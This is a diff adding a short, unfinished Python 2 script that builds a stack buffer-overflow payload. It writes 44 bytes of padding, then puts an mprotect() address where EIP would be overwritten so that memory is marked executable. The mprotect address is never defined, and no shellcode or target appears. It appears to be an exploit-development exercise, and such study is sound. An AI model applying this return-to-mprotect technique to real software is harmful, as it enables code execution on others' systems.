@@ -1,0 +1,19 @@
+import struct
+
+
+def p(x):
+    return struct.pack('<L', x)
+
+
+# empty payload
+payload = ""
+
+#padding
+payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+#mark memory as rwx
+payload += p(mprotect)          # EIP to mprotect()
+
+
+ 
+print payload
